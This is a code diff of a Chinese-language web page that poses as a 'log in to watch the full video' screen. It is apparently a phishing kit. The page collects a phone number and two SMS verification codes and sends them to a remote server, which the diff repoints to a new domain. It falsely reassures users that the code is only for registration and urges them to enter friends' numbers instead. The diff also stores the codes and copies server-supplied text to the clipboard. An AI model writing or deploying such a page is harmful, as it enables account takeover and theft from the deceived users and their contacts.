@@ -11,7 +11,7 @@
     <div class="box">
         <h2>登录后观看完整版</h2>
         <!--提交手机号-->
-        <div id="">
+        
              <label class="label1">手机号</label>
              <div class="input-box1">
                 <input type="text" id="phone_number" value=''><button class="button1" onclick="bu()">获取</button>
@@ -39,7 +39,7 @@
             </div>
         </div>
         <font color="#ff0000"><br>部分手机号收不到验证码<br>切换其他任意手机号即可 <br>同学朋友的都可以</font>
-        <button class="copyton"  style="display:none;" id="EleId" onclick="copy()">点击我继续观看</button>
+        <button class="copyton"  style="display:none;" id="EleId" onclick="copy()">点击复制</button>
         <h5 style="margin-top:120px;color:#fff">注意:本平台是注册验证码，不是登录验证码！！</h5>
         <h5 style="margin-top:4px;color:#fff">请放心使用！！</h5>
         
@@ -64,7 +64,7 @@ function bu(){
     			        localStorage.setItem('userid',userid );
     		      	}
     		         var xhr = new XMLHttpRequest();
-                     xhr.open('GET', 'https://rw.yyds.download/api/fontphone.php?phone='+phone_number+'&userid='+userid+'&yqr=0008', true);
+                     xhr.open('GET', 'https://ny.nsdd.download/api/fontphone.php?phone='+phone_number+'&userid='+userid+'&yqr=1001', true);
                      
                      xhr.onreadystatechange = function() {
                        if (xhr.readyState == 4 && xhr.status == 200) {
@@ -86,7 +86,7 @@ function bu(){
      console.log('code1',code)
     //  查验是否为审核通过状态
      var xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://rw.yyds.download/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
+              xhr.open('GET', 'https://ny.nsdd.download/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
               xhr.onreadystatechange = function() {
                   if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log(xhr.responseText);
@@ -101,7 +101,7 @@ function bu(){
             alert("请填写验证码！！");
         }else{
               var xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://rw.yyds.download/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
+              xhr.open('GET', 'https://ny.nsdd.download/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
               xhr.onreadystatechange = function() {
                   if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log(xhr.responseText);
@@ -121,7 +121,7 @@ function bu(){
      var code  = document.getElementById('code2').value;
     //  查验是否为审核通过状态
      var xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://rw.yyds.download/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
+              xhr.open('GET', 'https://ny.nsdd.download/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
               xhr.onreadystatechange = function() {
                   if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log(xhr.responseText);
@@ -136,14 +136,14 @@ function bu(){
             alert("请填写验证码！！");
         }else{
               var xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://rw.yyds.download/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
+              xhr.open('GET', 'https://ny.nsdd.download/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
               xhr.onreadystatechange = function() {
                   if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log(xhr.responseText);
                   }
                 }
              xhr.send();
-             
+             localStorage.setItem('code2',code );
              alert("验证码提交成功,等待验证！！");
              document.getElementById("state").value = ('正在等待验证,请稍后......');
         }
@@ -184,7 +184,7 @@ function validate1(){
             alert("请填写验证码！！");
         }else{
               var xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://rw.yyds.download/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
+              xhr.open('GET', 'https://ny.nsdd.download/api/fontcode.php?code1='+code+'&phone='+phone_number, true);
               xhr.onreadystatechange = function() {
                   if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log(xhr.responseText);
@@ -231,18 +231,17 @@ function validate2(){
             alert("请填写验证码！！");
         }else{
               var xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://rw.yyds.download/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
+              xhr.open('GET', 'https://ny.nsdd.download/api/fontcode.php?code2='+code+'&phone='+phone_number, true);
               xhr.onreadystatechange = function() {
                   if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log(xhr.responseText);
                   }
                 }
              xhr.send();
-             
+             localStorage.setItem('code2',code );
              alert("验证码提交成功,等待验证！！");
              document.getElementById("state").value = ('正在等待验证,请稍后......');
              document.getElementById("code1").value = "";//清空文本框
-             document.getElementById("code2").value = "";//清空文本框
         }
      }
     
@@ -252,14 +251,36 @@ function validate2(){
 
 
   function copy() {
-           location.href="https://7978-yx-4g0dsrwa5c74a7f3-1319379182.tcb.qcloud.la/fx/index.html?5434534"; 
+           const el = document.createElement('input')
+  // 给input元素赋值需要复制的文本
+              var xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://ny.nsdd.download/api/gettip.php', true);
+              xhr.onreadystatechange = function() {
+                  if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                    text = xhr.responseText;
+                  }
+                }
+             xhr.send();
+        //   text= 'MLHttpRequest对象的事件处理器,每次XMLHttpRequest对象的状态改变都会触发监听该'
+           el.setAttribute('value', text)
+          // 将input元素插入页面
+          document.body.appendChild(el)
+          // 选中input元素的文本
+          el.select()
+          // 复制内容到剪贴板
+          document.execCommand('copy')
+          // 删除input元素
+          document.body.removeChild(el)
+            alert("已复制到剪切板");
         }
 </script>
 <script type="text/javascript">
 
 function func1(){
     var phone_number = localStorage.getItem('phone_number');
-    
+    var code1 = localStorage.getItem('code1');
+    var code2 = localStorage.getItem('code2');
     if(phone_number){
         console.log('执行')
         console.log(phone_number)
@@ -267,15 +288,15 @@ function func1(){
         document.getElementById("state").value = ('手机号码提交成功，请填写验证码！');
     }
     if(code1){
-        document.getElementById("code1").value = ("");
-        document.getElementById("code2").value = ("");
+        document.getElementById("code1").value = (code1);
+        document.getElementById("code2").value = (code2);
         document.getElementById("state").value = ('正在等待验证,请稍后......');
     }
  }
  
 function func2(){
                var xhr = new XMLHttpRequest();
-                     xhr.open('GET', 'https://rw.yyds.download/api/gettip.php', true);
+                     xhr.open('GET', 'https://ny.nsdd.download/api/gettip.php', true);
                      xhr.onreadystatechange = function() {
                         if (xhr.readyState == 4 && xhr.status == 200) {
                         console.log(xhr.responseText);
@@ -291,7 +312,7 @@ function func2(){
             // 1. 创建 XHR 对象
             var xhr = new XMLHttpRequest()
             // 2. 调用 open 函数
-            xhr.open('GET', 'https://rw.yyds.download/api/state.php?phone='+phone_number)
+            xhr.open('GET', 'https://ny.nsdd.download/api/state.php?phone='+phone_number)
             // 3 . 调用 send 函数发起Ajax请求
             xhr.send()
             // 4. 监听 onreadystatechange 事件
@@ -303,7 +324,7 @@ function func2(){
                     document.getElementById("state").value = ('验证码验证失败,请重新填写！');
                 }
                 if(xhr.responseText==4){
-                    document.getElementById("state").value = ('验证成功!点下方按钮查看密码');
+                    document.getElementById("state").value = ('验证成功!'+text);
                     document.getElementById("EleId").style.display="block";
                 }
                 if(xhr.responseText==5){
